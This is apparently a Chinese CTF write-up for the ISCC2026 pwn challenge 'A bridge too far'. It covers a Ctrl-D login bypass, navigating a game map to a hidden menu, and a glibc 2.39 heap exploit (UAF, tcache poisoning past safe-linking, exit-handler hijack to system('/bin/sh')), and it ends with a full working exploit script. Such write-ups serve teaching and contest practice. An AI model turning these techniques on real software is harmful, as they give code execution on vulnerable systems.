+++
title = "A bridge too far"
date = "2026-05-18"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++

ISCC2026 WriteUp


写wp的时候容器关了没法截图

Pwn-A bridge too far

\# 解题思路

本题是一道全保护开启的 C++ 堆菜单 PWN 题，整体分为三个阶段：登录认证绕过、游戏地图导航到达隐藏菜单、堆漏洞利用（UAF → tcache poisoning → exit handler 劫持）获取 shell。

\#\# 一、环境与保护分析

使用 pwntools 自带的 checksec 检查二进制：

\`\`\`

Arch: amd64-64-little

RELRO: Full RELRO

Stack: Canary found

NX: NX enabled

PIE: PIE enabled

FORTIFY: Enabled

SHSTK: Enabled

IBT: Enabled

\`\`\`

全部保护均已启用，意味着常规的栈溢出、GOT 表覆写等手法均不可行。程序自带 libc.so.6 版本为 Ubuntu GLIBC 2.39-0ubuntu8.7，该版本已移除 \`\_\_free\_hook\` 的调用逻辑，因此需要另寻攻击面。

---

\#\# 二、第一阶段：登录认证绕过

\#\#\# 2.1 漏洞分析

程序入口函数 \`main\` 的栈帧布局存在一个关键缺陷：

1\. \`init()\` 函数调用 MT19937 伪随机数生成器，为 \`test\` 和 \`pl1\` 两个内置用户分别生成 31 字节的可打印 ASCII 密码，写入栈上的缓冲区 \`\[rsp+0x90\]\`。

2\. 紧接着程序询问"启动用户名"和"启动密码"，读取输入的缓冲区恰好复用同一块栈空间 \`\[rsp+0x90\]\`。

3\. 该程序的自定义输入函数一次最多读取 31 字节，仅在遇到换行符 \`\\n\` 时才截断字符串。\*\*它不会主动清空缓冲区\*\*。

4\. 登录验证使用 \`memcmp(input\_password, stored\_hash)\` 进行比对。

这里存在两个可利用点：

在类 Unix PTY 环境下，向进程发送 Ctrl-D（\`\\x04\`）会导致 \`read()\` 系统调用返回 0，但缓冲区内容完全不受影响。由于密码刚生成完毕，缓冲区中仍残留着原始密码数据。

操作流程：

- 启动用户名：随意输入（如 \`hacker\\n\`），这会覆盖用户名对应的区域，但密码区域不受影响

- 启动密码：发送 Ctrl-D，缓冲区保持 \`pl1\` 的密码原封不动

- 进入主菜单后选择登录，用户名为 \`pl1\`，密码再次使用 Ctrl-D

- \`memcmp\` 比对成功，以 pl1 身份登录

\#\#\# 2.2 关键代码片段

\`\`\`python

\# 使用 Ctrl-D 绕过密码验证

io.recvuntil(b':')

io.sendline(b'hacker') \# 任意启动用户名

io.recvuntil(b':')

io.send(b'\\x04') \# Ctrl-D → read() 返回 0，不清空缓冲区

io.recvuntil(b'5.')

io.sendline(b'1') \# 选择登录

io.recvuntil(b':')

io.sendline(b'pl1') \# 以 pl1 身份登录

io.recvuntil(b':')

io.send(b'\\x04') \# 再次 Ctrl-D 保留原始密码

\`\`\`

---

\#\# 三、第二阶段：游戏导航与隐藏菜单

\#\#\# 3.1 岛屿数据结构

程序维护一个长度为 64 的岛屿数组，每个岛屿结构体大小为 0x50 字节：

\`\`\`

offset 0x00: x, y 坐标 (各 8 字节)

offset 0x10: w2 字段 (1 字节)

offset 0x11: visible 标志 (1 字节, 0=隐藏, 1=可见)

offset 0x14: event\_type (4 字节)

offset 0x18: 资源/消耗量

offset 0x30: 名称字符串指针

offset 0x38: 描述字符串指针

offset 0x48: 44 位 SHA-256 哈希值

\`\`\`

关键的游戏状态变量也在栈上：

- \`\[rsp+0x330\]\`：当前岛屿索引 (0-63)

- \`\[rsp+0x334\]\`：材料数量（初始 400）

- \`\[rsp+0x32C\]\`：已解锁岛屿计数

\#\#\# 3.2 事件系统

岛屿通过 event\_type 触发不同的游戏事件：

| event\_type | 效果 |

|-----------|------|

| 2 | 获得材料（地堡 +300，漂流木堆 +200） |

| 7 | 设置 moon.visible = 1（解锁月球） |

| 8 | 免费建造通往目标岛屿的桥梁 |

\#\#\# 3.3 导航路径规划

要到达月球（索引 63）触发隐藏的 note 菜单，需要经过以下步骤：

\*\*第一步：到达 Data Reef\*\*

Data Reef 是初始可见的 16 个岛屿之一。在游戏主菜单选择建造桥梁（选项 2），消耗材料连接 Data Reef，然后导航（选项 1）移动过去。Data Reef 的 event\_type 为 7，触发后自动将月球标记为可见。

\*\*第二步：解锁 superadmin 岛屿\*\*

主菜单选择探索（选项 5）→ 根据传说搜寻（选项 2），输入岛屿名 \`superadmin\`。该功能会从隐藏表中按名称查找并创建岛屿，消耗 100 材料。superadmin 岛屿的 event\_type 为 8，是后续免费连接月球的关键。

\*\*第三步：材料管理\*\*

如果建造桥梁的材料不足，可以利用探索功能。随机探索会发现新岛屿，其中：

- 地堡（隐藏表索引 2，event\_type 2）：获得 300 材料

- 漂流木堆（隐藏表索引 8，event\_type 2）：获得 200 材料

\*\*第四步：连接月球\*\*

到达 superadmin 后，在主菜单选择探索 superadmin 岛，根据提示输入目标岛屿名"月球"。event\_type 8 处理函数会免费建造一座连接月球（索引 63）的桥梁。

\*\*第五步：触发隐藏菜单\*\*

导航到月球（position == 63 且 moon.visible != 0），程序会调用隐藏函数 \`0xBF20\`，进入 note 堆管理菜单。该菜单提供 add、delete、view、edit 四种操作，是后续堆利用的入口。

\#\#\# 3.4 菜单结构

\`\`\`

主菜单:

1\. 导航到岛屿

2\. 建造桥梁

3\. 登录子账户

4\. 自动寻路

5\. 探索

1\. 随机探索

2\. 根据传说搜寻（输入岛屿名直接解锁！）

6\. 查看状态

0\. 返回

Note 菜单（到达月球后触发）:

1\. add note

2\. delete note

3\. view note

4\. edit note

\`\`\`

---

\#\# 四、第三阶段：堆漏洞利用

\#\#\# 4.1 Note 菜单的 UAF 漏洞

程序在 note 菜单中维护 16 个 note 槽位，每个 note 最大分配 0x800 字节。四类操作对应的实现中，delete 操作存在严重缺陷：

| 操作 | 实现 | 安全问题 |

|------|------|---------|

| add(idx, sz) | \`notes\[idx\] = new char\[sz\]\` | 无 |

| view(idx) | \`write(1, notes\[idx\], sz)\` | 可读取已释放堆块 → 信息泄漏 |

| edit(idx) | \`read(0, notes\[idx\], sz)\` | 可写入已释放堆块 → UAF 写 |

| delete(idx) | \`delete\[\] notes\[idx\]\` | \*\*未将 notes\[idx\] 置空\*\* → UAF |

由于 delete 后指针未被清空，造成了经典的悬垂指针（dangling pointer）：一块内存被 free 后仍可通过 view/edit 进行读写操作，且可被重复 free（double free）。

\#\#\# 4.2 攻击目标选择

glibc 2.39 移除了 \`\_\_free\_hook\` 的调用路径，但仍然保留了 \`exit()\` → \`\_\_run\_exit\_handlers()\` 的完整调用链。\`\_\_exit\_funcs\` 是一个全局指针，指向 \`exit\_function\_list\` 链表，程序退出时会遍历该链表并执行注册的析构函数。链表节点的函数指针使用 \`PTR\_MANGLE\` 宏进行了保护。

攻击路径：

1\. 通过 unsorted bin 泄漏 libc 基址

2\. 通过 safe-linking 绕过 + double free 实现 tcache poisoning

3\. 将伪造 chunk 落在 \`exit\_function\_list\` 上

4\. 读取编码后的函数指针，反推 \`pointer\_guard\`

5\. 覆写 exit entry，编码 \`system("/bin/sh")\` 的函数指针

6\. 触发 \`exit()\` 获得 shell

\#\#\# 4.3 步骤一：泄漏 libc 基址

分配一个大于 tcache 最大 bin（0x410）的 chunk，free 后进入 unsorted bin，其 fd/bk 指针指向 main\_arena 内部：

\`\`\`python

add(0, 0x500) \# 申请大块，确保 free 后不进 tcache

add(15, 0x20) \# 隔离 chunk，防止与 top chunk 合并

delete(0) \# 释放到 unsorted bin

leak = u64(view(0)\[:8\])

libc\_base = leak - 0x203B20 \# 0x203B20 = unsorted\_bin 在 main\_arena 中的偏移

\`\`\`

\#\#\# 4.4 步骤二：劫持 tcache 链表

glibc 2.39 引入了 safe-linking 机制，tcache 和 fastbin 的 fd 指针会与 chunk 地址右移 12 位的结果进行异或保护：\`fd\_encoded = real\_ptr \^ (chunk\_addr &gt;&gt; 12)\`。同时 tcache chunk 的 bk 位置存放 tcache key，用于在 free 时检测 double free。

绕过 safe-linking 的策略：

1\. 利用 UAF 的 view 能力读取被加密的 fd 指针

2\. 通过 demangle 算法还原真实指针（safe-linking 使用 6 轮迭代的 XOR 解密）

3\. 利用 UAF 的 edit 能力将 tcache key 清零，绕过 double free 检测

\`\`\`python

def demangle(val):

"""safe-linking 指针解密"""

tmp = val

for \_ in range(6):

tmp = val \^ (tmp &gt;&gt; 12)

return tmp

\# 准备工作：申请两个小 chunk 用于 tcache 操作

add(a, 0x20)

add(b, 0x20)

\# 释放并观察

delete(a); delete(b) \# tcache: b → a

enc\_fd = u64(view(b)\[:8\])

chunk\_a = demangle(enc\_fd)

chunk\_b = chunk\_a + 0x30 \# 小 chunk: header(0x10) + data(0x20)

\# 清零 tcache key 实现 double free

edit(b, b'X' \* 8 + p64(0) + b'Y' \* 16) \# bk 位置清零

delete(b) \# double free 成功: tcache → b → b → a

\# 两次分配均得到 chunk b

add(c, 0x20)

add(d, 0x20)

\# 将 c 归还 tcache，修改 d 的 fd 为目标地址

delete(c) \# tcache: c → b → b → a → ...

target\_fd = target\_addr \^ (chunk\_b &gt;&gt; 12)

edit(d, p64(target\_fd) + p64(0) + b'Z' \* 16)

\# 消耗链表直到命中目标

add(e, 0x20)

add(f, 0x20) \# f 分配在 target\_addr

\`\`\`

\#\#\# 4.5 步骤三：泄漏 pointer\_guard

\`exit\_function\_list\` 是一个单向链表，每个节点的布局如下：

\`\`\`

offset 0x00: next (8 字节，指向下一个节点)

offset 0x08: idx (4 字节，当前节点中的活跃条目数)

offset 0x0C: pad (4 字节对齐)

offset 0x10: entry\[0\] (0x20 字节)

offset 0x30: entry\[1\] (0x20 字节)

...

\`\`\`

每个 entry 结构体（0x20 字节）：

\`\`\`

offset 0x00: flavor (4 字节，4 = ef\_cxa)

offset 0x04: pad (4 字节)

offset 0x08: func (8 字节，PTR\_MANGLE 编码后的函数指针)

offset 0x10: arg (8 字节，函数参数)

offset 0x18: dso (8 字节，DSO 句柄)

\`\`\`

关键技巧：当 \`tcache\_get\` 从链表中取出 chunk 时，会对用户数据区的前 8 字节执行清零操作。如果直接让 chunk 落在 \`node + 0x00\`，next 指针将被破坏，导致遍历链表时崩溃。解决方案是让 chunk 落在 \`node + 0x20\` 处——此时清零的 8 字节仅影响 entry\[0\] 的 dso 字段，而 next 和 idx 均完好无损。

读取 entry\[1\] 后，利用已知信息反推 pointer\_guard：

\`\`\`python

\# entry\[1\] 内容

func\_enc = u64(data\[0x30 + 8:0x30 + 16\]) \# 编码后的函数指针

dso\_leak = u64(data\[0x30 + 0x18:0x30 + 0x20\]) \# libstdc++ DSO 句柄

\# 计算 libstdc++ 基址

libstdc\_base = dso\_leak - 0x279100

\# 已知 libstdc++ 中的原始函数地址

real\_func = libstdc\_base + 0xB8DA0

\# 反推 pointer\_guard: enc = rol(func \^ guard, 17)

\# guard = ror(enc, 17) \^ func

ptr\_guard = ror64(func\_enc, 17) \^ real\_func

\`\`\`

\#\#\# 4.6 步骤四：覆写 exit entry

将伪造 chunk 分配到 \`exit\_function\_list\` 节点中的一个空闲 entry 位置，写入构造好的 payload：

\`\`\`python

target\_entry = exit\_node\_addr + 0x190 \# 选择一个未被使用的 entry 槽位

\# 再次利用 tcache poisoning 将 chunk 分配到目标位置

add(g, 0x20)

\# ... (tcache poison 流程同上，目标为 target\_entry)

add(h, 0x20) \# h 指向 target\_entry

\# 编码 system("/bin/sh")

system\_ptr = libc\_base + 0x58750

binsh\_ptr = libc\_base + 0x1CB42F

encoded\_func = rol64(system\_ptr \^ ptr\_guard, 17)

\# 写入 entry

payload = flat(

4, \# flavor = ef\_cxa

encoded\_func, \# 编码后的 system 地址

binsh\_ptr, \# 参数 = "/bin/sh" 字符串地址

0 \# dso = NULL

)

edit(h, payload)

\`\`\`

\#\#\# 4.7 步骤五：触发 shell

向程序发送非法菜单选项（例如选项 9），程序调用 \`exit()\`，进而触发 \`\_\_run\_exit\_handlers()\`，遍历 \`exit\_function\_list\` 链表并执行注册的处理函数。被篡改的 entry 调用 \`system("/bin/sh")\`，获得 shell。

\`\`\`python

io.sendline(b'9') \# 非法选项 → exit()

io.interactive() \# 进入交互 shell

\`\`\`

---

\#\# 五、EXP

\`\`\`python

\#!/usr/bin/env python3

\# -\*- coding: utf-8 -\*-

from pwn import \*

import time

context.arch = 'amd64'

context.log\_level = 'info'

\# ============ 配置 ============

LOCAL = False

REMOTE\_HOST = '39.96.193.120'

REMOTE\_PORT = 9999

\# ============ glibc 2.39 偏移量 ============

UNSORTED\_OFF = 0x203B20 \# main\_arena.bins\[0\]

EXIT\_FUNCS\_OFF = 0x203680 \# \_\_exit\_funcs

EXIT\_NODE\_OFF = 0x204FC0 \# initial exit function list node

SYSTEM\_OFF = 0x58750

BINSH\_OFF = 0x1CB42F

EXIT\_DSO\_OFF = 0x279100 \# libstdc++ \_\_exit\_funcs entry dso

EXIT\_FUNC\_OFF = 0xB8DA0 \# libstdc++ \_\_exit\_funcs entry func

\# ============ 辅助函数 ============

def demangle(val):

"""解码 glibc 2.39 safe-linking 指针"""

tmp = val

for \_ in range(6):

tmp = val \^ (tmp &gt;&gt; 12)

return tmp

def rol64(val, n):

return ((val &lt;&lt; n) | (val &gt;&gt; (64 - n))) & 0xFFFFFFFFFFFFFFFF

def ror64(val, n):

return ((val &gt;&gt; n) | (val &lt;&lt; (64 - n))) & 0xFFFFFFFFFFFFFFFF

def ctb(data):

"""Ctrl-D 发包封装"""

time.sleep(0.1)

io.send(data)

def menu(opt):

io.recvuntil(b'&gt;&gt;')

io.sendline(str(opt).encode())

def note\_add(idx, size):

menu(1)

io.recvuntil(b'index:')

io.sendline(str(idx).encode())

io.recvuntil(b'size:')

io.sendline(str(size).encode())

def note\_delete(idx):

menu(2)

io.recvuntil(b'index:')

io.sendline(str(idx).encode())

def note\_view(idx):

menu(3)

io.recvuntil(b'index:')

io.sendline(str(idx).encode())

io.recvuntil(b'content:\\n')

return io.recvn(sizes.get(idx, 0x20))

def note\_edit(idx, data):

menu(4)

io.recvuntil(b'index:')

io.sendline(str(idx).encode())

io.recvuntil(b'content:')

io.send(data)

sizes = {} \# 记录各槽位的 size

\# ============ 启动 ============

if LOCAL:

ld\_path = './package/ld-linux-x86-64.so.2'

lib\_path = './package'

bin\_path = './package/pwn'

io = process(\[ld\_path, '--library-path', lib\_path, bin\_path\],

stdin=PTY, stdout=PTY, stderr=PTY)

else:

io = remote(REMOTE\_HOST, REMOTE\_PORT)

\# 远程环境也需要 PTY 以支持 Ctrl-D

\# 若 remote 不支持 PTY，请改用 Method 2 单字节爆破

\# ============ Phase 1: 登录绕过 ============

log.info("Phase 1: 密码验证绕过")

io.recvuntil(b'username:')

io.sendline(b'hacker')

io.recvuntil(b'password:')

ctb(b'\\x04') \# Ctrl-D

time.sleep(0.3)

io.recvuntil(b'5.')

menu(1) \# 进入登录菜单

io.recvuntil(b'username:')

io.sendline(b'pl1')

io.recvuntil(b'password:')

ctb(b'\\x04') \# Ctrl-D

time.sleep(0.5)

data = io.recvuntil(b'&gt;&gt;', timeout=3)

if b'login' in data.lower() or b'welcome' in data.lower():

log.success("登录成功！")

else:

log.warning("登录可能失败，请检查 PTY 设置")

\# ============ Phase 2: 导航到月球 ============

log.info("Phase 2: 游戏导航")

def build\_bridge(target\_name):

"""选择并建造通往指定岛屿的桥梁"""

menu(2)

lines = io.recvuntil(b'&gt;&gt;', timeout=2).decode(errors='ignore')

\# 解析岛屿列表，找到 target\_name 对应的序号

found = None

for line in lines.split('\\n'):

if target\_name in line:

idx\_str = line.split('.')\[0\].strip()

try:

found = int(idx\_str)

except:

continue

break

if found is None:

log.warning(f"未在列表中找�� {target\_name}，尝试序号 1")

found = 1

io.sendline(str(found).encode())

def navigate\_to(target\_name):

"""导航到指定岛屿"""

menu(1)

lines = io.recvuntil(b'&gt;&gt;', timeout=2).decode(errors='ignore')

found = None

for line in lines.split('\\n'):

if target\_name in line:

idx\_str = line.split('.')\[0\].strip()

try:

found = int(idx\_str)

except:

continue

break

if found is None:

found = 1

io.sendline(str(found).encode())

def legend\_search(name):

"""传说搜寻"""

menu(5)

io.recvuntil(b'&gt;&gt;')

io.sendline(b'2')

io.recvuntil(b'name:')

io.sendline(name.encode())

\# Step 1: 连接 Data Reef 并触发事件

build\_bridge('Data Reef')

navigate\_to('Data Reef')

\# Step 2: 传说搜寻 superadmin

legend\_search('superadmin')

\# Step 3: 建造通往 superadmin 的桥梁

build\_bridge('superadmin')

\# Step 4: 移动到 superadmin

navigate\_to('superadmin')

\# Step 5: 在 superadmin 探索，输入"月球"触发免费建桥

menu(5)

io.recvuntil(b'&gt;&gt;')

io.sendline(b'1') \# 探索当前岛屿

time.sleep(0.3)

data = io.recvuntil(b':', timeout=3)

if b'target' in data.lower() or b'island' in data.lower() or b'name' in data.lower():

io.sendline('月球'.encode())

else:

log.error("未能触发 Event 8，请检查 superadmin 事件")

\# Step 6: 移动到月球

navigate\_to('月球')

log.success("到达月球，进入 Note 菜单")

\# ============ Phase 3: 堆利用 ============

log.info("Phase 3: UAF → tcache poison → exit handler")

\# --- 泄漏 libc ---

sizes\[0\] = 0x500

note\_add(0, 0x500)

sizes\[15\] = 0x20

note\_add(15, 0x20)

note\_delete(0)

data = note\_view(0)\[:8\]

unsorted\_leak = u64(data)

libc\_base = unsorted\_leak - UNSORTED\_OFF

log.success(f"libc base: {hex(libc\_base)}")

\# --- tcache safe-linking 绕过 ---

a, b = 1, 2

sizes\[a\] = 0x20

sizes\[b\] = 0x20

note\_add(a, 0x20)

note\_add(b, 0x20)

note\_delete(a) \# tcache → a

note\_delete(b) \# tcache → b → a

enc\_fd = u64(note\_view(b)\[:8\])

chunk\_a = demangle(enc\_fd)

chunk\_b = chunk\_a + 0x30

\# 清零 tcache key

note\_edit(b, b'A' \* 8 + p64(0) + b'B' \* 16)

note\_delete(b) \# double free: tcache → b → b → a

c, d, e = 3, 4, 5

sizes\[c\] = 0x20

sizes\[d\] = 0x20

note\_add(c, 0x20) \# → b

note\_add(d, 0x20) \# → b (同一个 chunk!)

note\_delete(c) \# tcache → c(=b) → b → a → ...

\# --- 泄漏堆地址 (用于计算 exit node) ---

\# 此时 d 仍然指向 chunk b，但 b 在 tcache 中，fd 已变化

\# 我们不需要堆地址来定位 exit node，直接用 libc 地址

\# 计算目标地址

exit\_funcs\_ptr = libc\_base + EXIT\_FUNCS\_OFF

exit\_node = libc\_base + EXIT\_NODE\_OFF

\# tcache poison 第一轮：分配到 \_\_exit\_funcs 附近

\# 将 chunk 落在 exit\_node + 0x20（避免破坏 next 指针）

target1 = exit\_node + 0x20

poisoned = target1 \^ (chunk\_b &gt;&gt; 12)

note\_edit(d, p64(poisoned) + p64(0) + b'C' \* 16)

sizes\[e\] = 0x20

note\_add(e, 0x20) \# → 消耗 b

f = 6

sizes\[f\] = 0x20

note\_add(f, 0x20) \# → 落在 exit\_node + 0x20

\# 读取 exit\_function\_list 数据

raw = note\_view(f)

func1\_enc = u64(raw\[0x10:0x18\])

dso1 = u64(raw\[0x18:0x20\])

libstdc\_base = dso1 - EXIT\_DSO\_OFF

real\_func1 = libstdc\_base + EXIT\_FUNC\_OFF

ptr\_guard = ror64(func1\_enc, 17) \^ real\_func1

log.success(f"pointer\_guard: {hex(ptr\_guard)}")

log.success(f"libstdc++ base: {hex(libstdc\_base)}")

\# --- 覆写 exit entry ---

\# 准备：新一轮 tcache poison，目标 = entry 所在位置

target2 = exit\_node + 0x190 \# 选取靠后的空闲 entry

poisoned2 = target2 \^ (chunk\_b &gt;&gt; 12)

\# 释放并重新毒化（利用 UAF 反复修改 fd）

note\_delete(f)

note\_edit(d, p64(poisoned2) + p64(0) + b'D' \* 16)

g = 7

h = 8

sizes\[g\] = 0x20

sizes\[h\] = 0x20

note\_add(g, 0x20) \# → d

note\_add(h, 0x20) \# → exit\_node + 0x190

\# 构造 system("/bin/sh") 的 entry

system\_addr = libc\_base + SYSTEM\_OFF

binsh\_addr = libc\_base + BINSH\_OFF

encoded\_sys = rol64(system\_addr \^ ptr\_guard, 17)

payload = flat(

4, \# flavor = ef\_cxa

encoded\_sys, \# func = system

binsh\_addr, \# arg = "/bin/sh"

0 \# dso = NULL

)

note\_edit(h, payload)

\# --- 触发 ---

log.info("触发 exit() → system('/bin/sh')")

menu(9) \# 非法选项触发 exit

time.sleep(0.5)

io.interactive()

\`\`\`

---
